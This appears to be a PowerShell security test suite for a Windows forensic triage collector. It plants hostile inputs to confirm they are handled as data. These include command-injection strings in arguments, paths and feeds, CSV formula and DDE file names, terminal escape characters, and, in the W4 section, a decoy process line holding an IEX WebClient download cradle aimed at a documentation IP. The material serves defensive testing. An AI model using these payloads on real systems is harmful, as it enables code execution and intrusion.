<#
    TATAR Triage Toolkit - security and robustness tests (Windows edition).

    The same properties tests/test-security.sh holds the Linux edition to, for a
    collector that runs on a machine and on files it cannot trust:

      W1-W3   input handling      hostile arguments, output paths and feeds
      W4      host data           hostile names and command lines on the host
      W5-W6   evidence protection the evidence folder is private; no reparse point
      W7      integrity           the manifest and its own digest detect tampering
      W8      containment         the host is unchanged and nothing goes online
      W9-W11  robustness          no temp leaks, no privilege needed, Unicode
      W12     determinism         two runs over a quiet host agree
      N1-N2   non-functional      time and memory budgets

    Mapping to OWASP ASVS / Top 10 and NIST SP 800-86 / 800-218 is in
    docs/SECURITY-TESTING.md. A SKIPPED test is reported as SKIP, never as PASS.

    Run from the repo root:
        pwsh       -NoProfile -File tests/Test-Security.ps1
        powershell -NoProfile -File tests\Test-Security.ps1
    Exit code: 0 = no failures, 1 = at least one failure.
#>
#Requires -Version 5.1
param(
    [string]$Collector = (Join-Path $PSScriptRoot '..\Tatar.ps1'),
    [switch]$Quick      # skip the long -All timing run (N1)
)

$ErrorActionPreference = 'Continue'
$script:Pass = 0; $script:Fail = 0; $script:Skip = 0
$PwshHost = if ($PSVersionTable.PSEdition -eq 'Core') { (Get-Process -Id $PID).Path } else { 'powershell' }
$Work = Join-Path ([IO.Path]::GetTempPath()) ('tatar-sec-' + [guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Path $Work -Force | Out-Null
$Pwn = Join-Path $Work 'pwn'; New-Item -ItemType Directory -Path $Pwn -Force | Out-Null
$Strict = New-Object System.Text.UTF8Encoding($false, $true)
$Esc = [string][char]27; $Bel = [string][char]7; $Rlo = [string][char]0x202E

function Check {
    param([string]$Name, [bool]$Ok, [string]$Detail = '')
    if ($Ok) { $script:Pass++; Write-Host ("  PASS  " + $Name) -ForegroundColor Green }
    else     { $script:Fail++; Write-Host ("  FAIL  " + $Name + "  " + $Detail) -ForegroundColor Red }
}
function Skip-Test { param([string]$Name, [string]$Why) $script:Skip++; Write-Host ("  SKIP  {0}  ({1})" -f $Name, $Why) -ForegroundColor Yellow }
function Section { param([string]$T) Write-Host ''; Write-Host $T }

# Command line for CreateProcess: quotes and backslashes escaped per the C
# runtime rules, so a hostile value reaches the collector as ITSELF and the test
# measures the collector, not the shell's quoting.
function ConvertTo-Arg {
    param([string]$A)
    if ($A -ne '' -and $A -notmatch '[\s"]') { return $A }
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.Append('"')
    $bs = 0
    foreach ($c in $A.ToCharArray()) {
        if ($c -eq '\') { $bs++ }
        elseif ($c -eq '"') { [void]$sb.Append('\' * (2 * $bs + 1)); [void]$sb.Append('"'); $bs = 0 }
        else { if ($bs -gt 0) { [void]$sb.Append('\' * $bs); $bs = 0 }; [void]$sb.Append($c) }
    }
    if ($bs -gt 0) { [void]$sb.Append('\' * (2 * $bs)) }
    [void]$sb.Append('"')
    $sb.ToString()
}

# Runs the collector as a child; returns exit code, timing, peak memory and any
# non-loopback TCP connection seen from the collector's process tree.
function Invoke-Collector {
    param([string[]]$Arguments, [int]$TimeoutSec = 300, [hashtable]$Env = @{}, [switch]$WatchNet)
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName = $PwshHost
    $all = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $Collector) + $Arguments
    $psi.Arguments = (($all | ForEach-Object { ConvertTo-Arg $_ }) -join ' ')
    $psi.UseShellExecute = $false; $psi.CreateNoWindow = $true
    $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
    foreach ($k in $Env.Keys) { $psi.EnvironmentVariables[$k] = [string]$Env[$k] }
    $p = New-Object System.Diagnostics.Process; $p.StartInfo = $psi
    $sw = [Diagnostics.Stopwatch]::StartNew()
    [void]$p.Start()
    $so = $p.StandardOutput.ReadToEndAsync(); $se = $p.StandardError.ReadToEndAsync()
    $peak = 0L; $net = New-Object System.Collections.Generic.List[string]; $timedOut = $false
    while (-not $p.WaitForExit(400)) {
        try { $p.Refresh(); if ($p.PeakWorkingSet64 -gt $peak) { $peak = $p.PeakWorkingSet64 } } catch { }
        if ($WatchNet) {
            try {
                $tree = @{}; $tree[[int]$p.Id] = 1
                $procs = @(Get-CimInstance Win32_Process -ErrorAction Stop)
                for ($i = 0; $i -lt 3; $i++) { foreach ($q in $procs) { if ($tree.ContainsKey([int]$q.ParentProcessId)) { $tree[[int]$q.ProcessId] = 1 } } }
                foreach ($c in @(Get-NetTCPConnection -ErrorAction Stop | Where-Object { $_.RemoteAddress -notin @('127.0.0.1', '::1', '0.0.0.0', '::') -and $tree.ContainsKey([int]$_.OwningProcess) })) {
                    $net.Add(("{0}:{1} (pid {2})" -f $c.RemoteAddress, $c.RemotePort, $c.OwningProcess))
                }
            } catch { }
        }
        if ($sw.Elapsed.TotalSeconds -gt $TimeoutSec) { $timedOut = $true; try { $p.Kill() } catch { }; break }
    }
    if (-not $timedOut) { $p.WaitForExit() }
    [pscustomobject]@{ Exit = $(if ($timedOut) { -1 } else { $p.ExitCode }); Seconds = [math]::Round($sw.Elapsed.TotalSeconds, 1); PeakMB = [math]::Round($peak / 1MB, 0); Net = @($net); TimedOut = $timedOut }
}
function Get-EvidenceDir { param([string]$Base) $d = Get-ChildItem -LiteralPath $Base -Directory -ErrorAction SilentlyContinue | Select-Object -First 1; if ($d) { $d.FullName } else { $null } }
function Test-JsonFile {
    param([string]$Path)
    try { $t = $Strict.GetString([IO.File]::ReadAllBytes($Path)); if ($t.Length -gt 0 -and $t[0] -eq [char]0xFEFF) { return $false }; $null = $t | ConvertFrom-Json; return $true } catch { return $false }
}
function Get-Json { param([string]$Path) try { [IO.File]::ReadAllText($Path, [Text.Encoding]::UTF8) | ConvertFrom-Json } catch { $null } }
function Test-PwnClean { @(Get-ChildItem -LiteralPath $Pwn -Force -ErrorAction SilentlyContinue).Count -eq 0 }

# Generated text a person reads in a terminal. Verbatim copies of host files are
# evidence and are not scanned. CRLF is legitimate; a lone CR is not.
$CtlPattern = '[\x00-\x08\x0B\x0C\x0E-\x1F\x7F\u202A-\u202E\u2066-\u2069]|\r(?!\n)'
function Get-ControlHit {
    param([string]$Dir)
    $hits = @()
    foreach ($f in @(Get-ChildItem -LiteralPath $Dir -File -Force -ErrorAction SilentlyContinue)) {
        if ($f.Name -in @('summary.txt', 'paste.txt', 'ARTIFACTS.md', 'tatar.log', 'timeline.csv', 'chain_of_custody.txt') -or $f.Name -like 'TATAR_Report_*') {
            $t = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName))
            $mm = [regex]::Match($t, $CtlPattern)
            if ($mm.Success) { $cx = $t.Substring([Math]::Max(0, $mm.Index - 30), [Math]::Min(60, $t.Length - [Math]::Max(0, $mm.Index - 30))); $hits += ('{0}@U+{1:X4} ctx<{2}>' -f $f.Name, [int][char]$mm.Value[0], ($cx -replace '[^\x20-\x7E]', '?')) }
        }
    }
    $hits -join ' '
}

# ---------------------------------------------------------------------------
Section 'W1  hostile arguments cannot inject or escape'
# ---------------------------------------------------------------------------
$b = Join-Path $Work 'w1'
$hcase = "x`"; New-Item '$Pwn\p1'; `$(New-Item '$Pwn\p2'); ``New-Item '$Pwn\p3'`` \ end"
$r = Invoke-Collector -Arguments @('-Modules', 'sysinfo', '-Silent', '-OutputPath', $b, '-CaseId', $hcase, '-Examiner', "O'Brien `"}], `"injected`": true")
$d = Get-EvidenceDir $b
Check 'W1 : run finished with a defined exit code' (($r.Exit -eq 0 -or $r.Exit -eq 2) -and -not $r.TimedOut) "exit $($r.Exit)"
Check 'W1 : summary.json is valid JSON despite quotes, backslashes and braces' ($d -and (Test-JsonFile (Join-Path $d 'summary.json')))
Check 'W1 : no command in -CaseId / -Examiner was executed' (Test-PwnClean) (@(Get-ChildItem $Pwn) -join ',')
$s = if ($d) { Get-Json (Join-Path $d 'summary.json') } else { $null }
Check 'W1 : the values are carried as data, not interpreted' ($s -and $s.caseId -like '*New-Item*' -and $s.examiner -like "*Brien*" -and -not ($s.PSObject.Properties.Name -contains 'injected'))
$b = Join-Path $Work 'w1b'
$null = Invoke-Collector -Arguments @('-Modules', 'sysinfo', '-Silent', '-OutputPath', $b, '-CaseId', '..\..\escape', '-Examiner', '..\escape2')
$esc = @(Get-ChildItem -LiteralPath $Work -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'escape*' -and $_.FullName -notlike ($b + '*') })
Check 'W1 : a path-like -CaseId cannot place files outside the output folder' ($esc.Count -eq 0) ($esc.FullName -join ',')
$b = Join-Path $Work 'w1c'
$uni = 'T' + [char]0x0435 + [char]0x0441 + [char]0x0442 + '-' + [char]0x04E8 + '-' + [char]0x04AE + '-' + [char]0x65E5 + [char]0x672C + [char]0x8A9E + '-' + [char]0xF1
$null = Invoke-Collector -Arguments @('-Modules', 'sysinfo', '-Silent', '-OutputPath', $b, '-CaseId', $uni)
$d = Get-EvidenceDir $b; $s = if ($d) { Get-Json (Join-Path $d 'summary.json') } else { $null }
Check 'W1 : a Unicode -CaseId round-trips exactly' ($s -and $s.caseId -ceq $uni) "got '$($s.caseId)'"

# ---------------------------------------------------------------------------
Section 'W2  an awkward output path is data'
# ---------------------------------------------------------------------------
$odd = Join-Path $Work ("o u't `$(New-Item -Path pwnw2) ;&^% [x] [y] caf" + [char]0xE9)
$r = Invoke-Collector -Arguments @('-Modules', 'sysinfo', '-Silent', '-OutputPath', $odd)
$d = Get-EvidenceDir -Base $odd
Check 'W2 : evidence is written inside exactly that folder (wildcard characters included)' ($d -and (Test-Path -LiteralPath (Join-Path $d 'summary.json'))) "exit $($r.Exit)"
Check 'W2 : nothing in the path was executed' ((Test-PwnClean) -and -not (Test-Path -LiteralPath 'pwnw2'))

# ---------------------------------------------------------------------------
Section 'W3  hostile allowlist and IOC feeds'
# ---------------------------------------------------------------------------
$fd = Join-Path $Work 'feeds'; New-Item -ItemType Directory -Path $fd -Force | Out-Null
$utf8 = New-Object System.Text.UTF8Encoding($false)
[IO.File]::WriteAllBytes((Join-Path $fd 'empty.json'), [byte[]]@())
[IO.File]::WriteAllBytes((Join-Path $fd 'binary.json'), [byte[]](1..255 * 50 | ForEach-Object { $_ % 256 }))
[IO.File]::WriteAllBytes((Join-Path $fd 'badutf8.json'), [byte[]](0x7B, 0x22, 0x70, 0x22, 0x3A, 0xFF, 0xFE, 0xC3, 0x28, 0x7D))
[IO.File]::WriteAllText((Join-Path $fd 'deep.json'), (('[' * 20000) + (']' * 20000)), $utf8)
[IO.File]::WriteAllText((Join-Path $fd 'bigstring.json'), ('{"paths":["' + ('A' * 2000000) + '"]}'), $utf8)
$glob = @{ paths = @('[', '[[]', '*', '?', 'C:\[a-', 'C:\Win[dows\*', "$Pwn\`$(New-Item p5)", "'; New-Item '$Pwn\p6'; '", '\', 'C:\*\*\*\*\*\*\*\*\*\*x', '\\?\C:\*'); publishers = @('*', '[', '.*'); hashes = @('not-a-hash', ('A' * 64), "'; New-Item '$Pwn\p7'") }
[IO.File]::WriteAllText((Join-Path $fd 'globs.json'), ($glob | ConvertTo-Json), $utf8)
$many = @{ paths = @(1..50000 | ForEach-Object { "C:\nonexistent\$_\*" }) }
[IO.File]::WriteAllText((Join-Path $fd 'manyitems.json'), ($many | ConvertTo-Json), $utf8)
foreach ($name in @('empty', 'binary', 'badutf8', 'deep', 'bigstring', 'globs', 'manyitems')) {
    $b = Join-Path $Work ("w3-" + $name)
    $r = Invoke-Collector -Arguments @('-Modules', 'sysinfo', '-Silent', '-OutputPath', $b, '-Allowlist', (Join-Path $fd "$name.json")) -TimeoutSec 180
    Check "W3 : allowlist '$name' -> clean exit (0/2), no crash or hang" (($r.Exit -eq 0 -or $r.Exit -eq 2) -and -not $r.TimedOut) "exit $($r.Exit) after $($r.Seconds)s"
    $d = Get-EvidenceDir $b
    if ($d) { Check "W3 : allowlist '$name' -> summary.json still valid" (Test-JsonFile (Join-Path $d 'summary.json')) }
}
$ioc = @{ hashes = @("'; New-Item '$Pwn\p8'"); ips = @('999.999.999.999', '::::', '1.2.3.4/../../etc'); domains = @("`$(New-Item '$Pwn\p9')", ('a' * 300), '*', '['); filenames = @('[', '*', '`New-Item x`') }
[IO.File]::WriteAllText((Join-Path $fd 'ioc-hostile.json'), ($ioc | ConvertTo-Json), $utf8)
$r = Invoke-Collector -Arguments @('-Modules', 'sysinfo,network', '-Silent', '-OutputPath', (Join-Path $Work 'w3-ioc'), '-IOCFile', (Join-Path $fd 'ioc-hostile.json')) -TimeoutSec 180
Check 'W3 : hostile IOC feed -> clean exit (0/2)' (($r.Exit -eq 0 -or $r.Exit -eq 2) -and -not $r.TimedOut) "exit $($r.Exit)"
Check 'W3 : no feed entry was executed as a command' (Test-PwnClean)

# ---------------------------------------------------------------------------
Section 'W4  hostile names and command lines on the host being examined'
# ---------------------------------------------------------------------------
$host4 = Join-Path $env:TEMP ('tatar-host-' + [guid]::NewGuid().ToString('N').Substring(0, 6))
New-Item -ItemType Directory -Path $host4 -Force | Out-Null
$names = @('=cmd|calc!A0.exe', '+SUM(1).exe', '-2+3.exe', '@SUM(1).exe', "q'uote.exe", 'semi;colon.exe', 'amp&ersand.exe', 'dollar$(calc).exe', 'tick`calc`.exe', '[brack].exe', '%PATH%.exe',
    "esc${Esc}[2J${Esc}[31mRED.exe", "esc2${Esc}]0;owned${Bel}.exe", "bell${Bel}x.exe", "bidi${Rlo}exe.txt.exe", ('a' * 200 + '.exe'), "u$([char]0xFC)n$([char]0xEE)$([char]0x2603).exe", 'sp ace.exe')
$made = 0
foreach ($n in $names) { try { [IO.File]::WriteAllText('\\?\' + $host4 + '\' + $n, 'MZ'); $made++ } catch { } }
Write-Host ("        planted {0} of {1} hostile file names" -f $made, $names.Count)
$proc1 = Start-Process -FilePath $PwshHost -ArgumentList @('-NoProfile', '-Command', ("Start-Sleep 120 # ${Esc}[31mowned ${Rlo} IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a') -enc")) -PassThru -WindowStyle Hidden
Start-Sleep -Seconds 2
$b = Join-Path $Work 'w4'
$r = Invoke-Collector -Arguments @('-Modules', 'sysinfo,process,indicators,timeline', '-Silent', '-OutputPath', $b) -TimeoutSec 240
$d = Get-EvidenceDir $b
try { $proc1.Kill() } catch { }
Check 'W4 : run finished with a defined exit code' (($r.Exit -eq 0 -or $r.Exit -eq 2) -and -not $r.TimedOut) "exit $($r.Exit) after $($r.Seconds)s"
Check 'W4 : summary.json is valid JSON' ($d -and (Test-JsonFile (Join-Path $d 'summary.json')))
Check 'W4 : findings.json is valid JSON' ($d -and (Test-JsonFile (Join-Path $d 'findings.json')))
$seen = $false; $seenP = $false
if ($d) { foreach ($f in Get-ChildItem -LiteralPath $d -Recurse -File -Force) { $t = [Text.Encoding]::UTF8.GetString([IO.File]::ReadAllBytes($f.FullName)); if ($t -like '*tatar-host-*') { $seen = $true }; if ($t -like '*203.0.113.9*') { $seenP = $true } } }
Check 'W4 : the hostile file names were seen (the test has teeth)' $seen
Check 'W4 : the hostile process was seen (the test has teeth)' $seenP
$hit = if ($d) { Get-ControlHit $d } else { 'no evidence' }
Check 'W4 : no generated text file carries a raw control, escape or bidi character' ([string]::IsNullOrEmpty($hit)) "in: [$hit] n=$(@($hit).Count) len=$("$hit".Length)"
if ($d -and (Test-Path (Join-Path $d 'timeline.csv'))) {
    $rows = @(Import-Csv -LiteralPath (Join-Path $d 'timeline.csv') -ErrorAction SilentlyContinue)
    $formula = @($rows | ForEach-Object { $_.PSObject.Properties | ForEach-Object { [string]$_.Value } } | Where-Object { $_ -match '^[=+\-@]' })
    Check 'W4 : timeline.csv parses and no cell can run as a formula' ($formula.Count -eq 0) (($formula | Select-Object -First 2) -join ' | ')
}
Check 'W4 : no host file name was executed' (Test-PwnClean)
Remove-Item -LiteralPath ('\\?\' + $host4) -Recurse -Force -ErrorAction SilentlyContinue

# ---------------------------------------------------------------------------
Section 'W5  the evidence folder is private'
# ---------------------------------------------------------------------------
$pubBase = Join-Path $env:SystemDrive ('tatar-sec-' + [guid]::NewGuid().ToString('N').Substring(0, 6))
$made5 = $false; try { New-Item -ItemType Directory -Path $pubBase -ErrorAction Stop | Out-Null; $made5 = $true } catch { }
if (-not $made5) { Skip-Test 'W5 : evidence ACL' 'cannot create a folder on the system drive' } else {
    $r = Invoke-Collector -Arguments @('-Modules', 'sysinfo,users', '-Silent', '-OutputPath', $pubBase)
    $d = Get-EvidenceDir $pubBase
    $broad = @('S-1-1-0', 'S-1-5-32-545', 'S-1-5-11', 'S-1-5-4')   # Everyone, Users, Authenticated Users, Interactive
    $bad = @()
    if ($d) {
        foreach ($item in @(Get-Item -LiteralPath $d) + @(Get-ChildItem -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue)) {
            $acl = Get-Acl -LiteralPath $item.FullName
            foreach ($rule in $acl.GetAccessRules($true, $true, [Security.Principal.SecurityIdentifier])) {
                if ($rule.AccessControlType -eq 'Allow' -and $broad -contains $rule.IdentityReference.Value) { $bad += ("{0} -> {1}" -f $item.Name, $rule.IdentityReference.Value); break }
            }
            if ($bad.Count -ge 3) { break }
        }
    }
    Check 'W5 : no file or folder in the evidence set grants access to Everyone, Users or Authenticated Users' ($d -and $bad.Count -eq 0) ($bad -join '; ')
    Remove-Item -LiteralPath $pubBase -Recurse -Force -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------------------
Section 'W6  the collector refuses to write through a reparse point'
# ---------------------------------------------------------------------------
$victim = Join-Path $Work 'victim'; New-Item -ItemType Directory -Path $victim -Force | Out-Null
$junction = Join-Path $Work 'link'
$jok = $false; try { New-Item -ItemType Junction -Path $junction -Target $victim -ErrorAction Stop | Out-Null; $jok = $true } catch { }
if (-not $jok) { Skip-Test 'W6 : junction' 'could not create a junction here' } else {
    $r = Invoke-Collector -Arguments @('-Modules', 'sysinfo', '-Silent', '-OutputPath', $junction)
    Check 'W6 : -OutputPath that is a junction is refused' ($r.Exit -ne 0 -and $r.Exit -ne 2) "exit $($r.Exit)"
    Check 'W6 : nothing was written through the junction' (@(Get-ChildItem -LiteralPath $victim -Force -ErrorAction SilentlyContinue).Count -eq 0) (@(Get-ChildItem -LiteralPath $victim -Force) | Select-Object -First 3 | ForEach-Object Name) -join ','
    [IO.Directory]::Delete($junction)
}

# ---------------------------------------------------------------------------
Section 'W7  integrity: tampering is detected'
# ---------------------------------------------------------------------------
function Test-Manifest {
    param([string]$Dir, [string]$Manifest = 'manifest_sha256.txt')
    $bad = 0
    foreach ($line in [IO.File]::ReadAllLines((Join-Path $Dir $Manifest))) {
        if ($line.Trim() -eq '') { continue }
        $p = $line -split '  ', 2
        if ($p.Count -ne 2) { $bad++; continue }
        $f = Join-Path $Dir (($p[1] -replace '^\./', '') -replace '/', '\')
        if (-not (Test-Path -LiteralPath $f)) { $bad++; continue }
        if ((Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLower() -ne $p[0].ToLower()) { $bad++ }
    }
    $bad
}
$b = Join-Path $Work 'w7'
$null = Invoke-Collector -Arguments @('-Modules', 'sysinfo,users', '-Silent', '-OutputPath', $b)
$d = Get-EvidenceDir $b
if ($d) {
    Check 'W7 : an untouched folder verifies' ((Test-Manifest $d) -eq 0)
    $c = Join-Path $Work 'w7m'; Copy-Item -LiteralPath $d -Destination $c -Recurse; Add-Content -LiteralPath (Join-Path $c 'summary.json') -Value 'x'
    Check 'W7 : a modified file is detected' ((Test-Manifest $c) -gt 0)
    $c = Join-Path $Work 'w7d'; Copy-Item -LiteralPath $d -Destination $c -Recurse; Remove-Item -LiteralPath (Join-Path $c 'summary.txt')
    Check 'W7 : a deleted file is detected' ((Test-Manifest $c) -gt 0)
    $c = Join-Path $Work 'w7r'; Copy-Item -LiteralPath $d -Destination $c -Recurse; Set-Content -LiteralPath (Join-Path $c 'summary.txt') -Value '0000'
    Check 'W7 : a replaced file is detected' ((Test-Manifest $c) -gt 0)
    $side = Join-Path $d 'manifest_sha256.txt.sha256'
    $mh = (Get-FileHash -LiteralPath (Join-Path $d 'manifest_sha256.txt') -Algorithm SHA256).Hash.ToLower()
    Check 'W7 : the manifest digest sidecar matches the untouched manifest' ((Test-Path -LiteralPath $side) -and ([IO.File]::ReadAllText($side).Trim() -eq "$mh  manifest_sha256.txt"))
    $c = Join-Path $Work 'w7t'; Copy-Item -LiteralPath $d -Destination $c -Recurse; Add-Content -LiteralPath (Join-Path $c 'manifest_sha256.txt') -Value 'forged  ./summary.json'
    $mh2 = (Get-FileHash -LiteralPath (Join-Path $c 'manifest_sha256.txt') -Algorithm SHA256).Hash.ToLower()
    Check 'W7 : an edited manifest no longer matches its own digest' ((Test-Path -LiteralPath $side) -and ([IO.File]::ReadAllText($side).Trim() -ne "$mh2  manifest_sha256.txt"))
    $sh = (Get-FileHash -LiteralPath $Collector -Algorithm SHA256).Hash.ToLower()
    Check 'W7 : chain_of_custody.txt records the hash of the script that ran' ([IO.File]::ReadAllText((Join-Path $d 'chain_of_custody.txt')).ToLower().Contains($sh))
} else { Skip-Test 'W7 : integrity' 'no evidence folder' }

# ---------------------------------------------------------------------------
Section 'W8  containment: the host is unchanged and nothing goes online'
# ---------------------------------------------------------------------------
function Get-Canary {
    $o = [ordered]@{}
    foreach ($k in @('HKCU:\Software\Microsoft\Windows\CurrentVersion\Run', 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce', 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run')) {
        $o[$k] = try { (Get-ItemProperty -LiteralPath $k -ErrorAction Stop | Out-String).Trim() } catch { '' }
    }
    $o['startup-user'] = (Get-ChildItem ([Environment]::GetFolderPath('Startup')) -Force -ErrorAction SilentlyContinue | ForEach-Object { "$($_.Name) $($_.Length)" }) -join ';'
    $o['hosts'] = try { (Get-FileHash (Join-Path $env:SystemRoot 'System32\drivers\etc\hosts') -Algorithm SHA256).Hash } catch { '' }
    $o['tasks'] = try { @(Get-ScheduledTask -ErrorAction Stop).Count } catch { -1 }
    $o['services'] = try { (Get-CimInstance Win32_Service | Sort-Object Name | ForEach-Object { "$($_.Name)=$($_.StartMode)" }) -join ';' } catch { '' }
    $o['users'] = try { (Get-LocalUser | ForEach-Object { "$($_.Name)=$($_.Enabled)" }) -join ';' } catch { '' }
    $o['execpolicy'] = try { (Get-ExecutionPolicy -List | ForEach-Object { "$($_.Scope)=$($_.ExecutionPolicy)" }) -join ';' } catch { '' }
    $o
}
$before = Get-Canary
$b = Join-Path $Work 'w8'
$r = Invoke-Collector -Arguments @('-Modules', 'sysinfo,network,process,sessions,users,services,persistence,apps,indicators,timeline', '-Silent', '-OutputPath', $b) -TimeoutSec 400 -WatchNet
$after = Get-Canary
$diff = @($before.Keys | Where-Object { [string]$before[$_] -ne [string]$after[$_] })
# Name the service that changed. A start mode that flips on a CI runner while the
# collector (which only reads) is running is otherwise a mystery in the log.
$svcWhat = ''
if ($diff -contains 'services') {
    $sb = @{}; foreach ($e in ([string]$before['services'] -split ';')) { if ($e) { $kv = $e -split '=', 2; $sb[$kv[0]] = $kv[1] } }
    $sa = @{}; foreach ($e in ([string]$after['services']  -split ';')) { if ($e) { $kv = $e -split '=', 2; $sa[$kv[0]] = $kv[1] } }
    $names = @(($sb.Keys + $sa.Keys) | Select-Object -Unique | Where-Object { $sb[$_] -ne $sa[$_] })
    $svcWhat = ' [' + ((@($names | Select-Object -First 5 | ForEach-Object { "$_ : $($sb[$_]) -> $($sa[$_])" })) -join '; ') + ']'
}
Check 'W8 : the traced run finished' (($r.Exit -eq 0 -or $r.Exit -eq 2) -and -not $r.TimedOut) "exit $($r.Exit)"
Check 'W8 : Run keys, startup folder, hosts file, scheduled tasks, services and accounts are unchanged' ($diff.Count -eq 0) (($diff -join ', ') + $svcWhat)
Check 'W8 : no non-loopback TCP connection was seen from the collector or its children (offline)' ($r.Net.Count -eq 0) (($r.Net | Select-Object -Unique | Select-Object -First 3) -join '; ')

# ---------------------------------------------------------------------------
Section 'W9  no temporary files are left behind'
# ---------------------------------------------------------------------------
$tmp9 = Join-Path $Work 'tmp9'; New-Item -ItemType Directory -Path $tmp9 -Force | Out-Null
$null = Invoke-Collector -Arguments @('-Modules', 'sysinfo,network,users,process', '-Silent', '-OutputPath', (Join-Path $Work 'w9')) -Env @{ TEMP = $tmp9; TMP = $tmp9 }
$left = @(Get-ChildItem -LiteralPath $tmp9 -Force -ErrorAction SilentlyContinue)
Check 'W9 : a normal run leaves nothing in TEMP' ($left.Count -eq 0) (($left | Select-Object -First 3 | ForEach-Object Name) -join ', ')

# ---------------------------------------------------------------------------
Section 'W10 no privilege is required'
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) { Skip-Test 'W10 : unprivileged run' 'running elevated' } else {
    $b = Join-Path $Work 'w10'
    $r = Invoke-Collector -Arguments @('-Modules', 'sysinfo,network,process,sessions,users,services,persistence,apps,indicators', '-Silent', '-OutputPath', $b) -TimeoutSec 300
    $d = Get-EvidenceDir $b; $s = if ($d) { Get-Json (Join-Path $d 'summary.json') } else { $null }
    Check 'W10 : exit code is 0 or 2 without privilege' (($r.Exit -eq 0 -or $r.Exit -eq 2) -and -not $r.TimedOut) "exit $($r.Exit)"
    Check 'W10 : summary.json says the run was unprivileged' ($s -and $s.privileged -eq $false)
    $log = if ($d) { [IO.File]::ReadAllText((Join-Path $d 'tatar.log')) } else { '' }
    Check 'W10 : no module crashed (FAILED) because privilege was missing' ($d -and $log -notmatch 'FAILED') (([regex]::Matches($log, '.*FAILED.*') | Select-Object -First 2 | ForEach-Object Value) -join ' | ')
}

# ---------------------------------------------------------------------------
Section 'W11 encoding'
# ---------------------------------------------------------------------------
$b = Join-Path $Work 'w11'
$null = Invoke-Collector -Arguments @('-Modules', 'sysinfo,users,network', '-Silent', '-OutputPath', $b)
$d = Get-EvidenceDir $b
Check 'W11 : summary.json is strict UTF-8 without a byte-order mark' ($d -and (Test-JsonFile (Join-Path $d 'summary.json')))
Check 'W11 : findings.json is strict UTF-8 without a byte-order mark' ($d -and (Test-JsonFile (Join-Path $d 'findings.json')))

# ---------------------------------------------------------------------------
Section 'W12 two runs over a quiet host agree'
# ---------------------------------------------------------------------------
$qm = 'users,services,persistence,apps'
$null = Invoke-Collector -Arguments @('-Modules', $qm, '-Silent', '-OutputPath', (Join-Path $Work 'w12a')) -TimeoutSec 300
$null = Invoke-Collector -Arguments @('-Modules', $qm, '-Silent', '-OutputPath', (Join-Path $Work 'w12b')) -TimeoutSec 300
$da = Get-EvidenceDir (Join-Path $Work 'w12a'); $db = Get-EvidenceDir (Join-Path $Work 'w12b')
if ($da -and $db) {
    $ka = @((Get-Json (Join-Path $da 'summary.json')).findings | ForEach-Object { "{0}|{1}|{2}" -f $_.category, $_.artifactClass, $_.message } | Sort-Object)
    $kb = @((Get-Json (Join-Path $db 'summary.json')).findings | ForEach-Object { "{0}|{1}|{2}" -f $_.category, $_.artifactClass, $_.message } | Sort-Object)
    $d1 = @($ka | Where-Object { $kb -notcontains $_ }) + @($kb | Where-Object { $ka -notcontains $_ })
    Check 'W12 : the same findings come out of two consecutive runs' ($d1.Count -eq 0) (($d1 | Select-Object -First 2) -join ' ## ')
} else { Check 'W12 : determinism' $false 'a run produced no evidence' }

# ---------------------------------------------------------------------------
Section 'N1  time budget'
# ---------------------------------------------------------------------------
if ($Quick) { Skip-Test 'N1 : full -All run' '-Quick given' } else {
    $b = Join-Path $Work 'n1'
    $r = Invoke-Collector -Arguments @('-All', '-Silent', '-OutputPath', $b) -TimeoutSec 900
    Check 'N1 : a full -All run finishes within 600 s' (-not $r.TimedOut -and $r.Seconds -le 600) "$($r.Seconds)s"
    Write-Host ("        full run: {0}s, peak working set of the collector host: {1} MB" -f $r.Seconds, $r.PeakMB)
    $d = Get-EvidenceDir $b; $s = if ($d) { Get-Json (Join-Path $d 'summary.json') } else { $null }
    if ($s -and $s.moduleStatus) {
        $top = @($s.moduleStatus | Sort-Object { [double]$_.seconds } -Descending | Select-Object -First 4)
        Write-Host ('        slowest modules: ' + (($top | ForEach-Object { "$($_.module) $($_.seconds)s" }) -join ', '))
        $worst = ($s.moduleStatus | Measure-Object -Property seconds -Maximum).Maximum
        Check 'N1 : no single module takes more than 300 s' ([double]$worst -le 300) "$worst s"
    }
    Section 'N2  memory budget'
    Check 'N2 : the collector host stays under 500 MB working set' ($r.PeakMB -lt 500) "$($r.PeakMB) MB"
}

if ($env:TATAR_SEC_KEEP) { Write-Host "kept: $Work" } else { Remove-Item -LiteralPath $Work -Recurse -Force -ErrorAction SilentlyContinue }
Write-Host ''
Write-Host ("RESULT  passed: {0}  failed: {1}  skipped: {2}" -f $script:Pass, $script:Fail, $script:Skip)
if ($script:Fail -gt 0) { exit 1 } else { exit 0 }
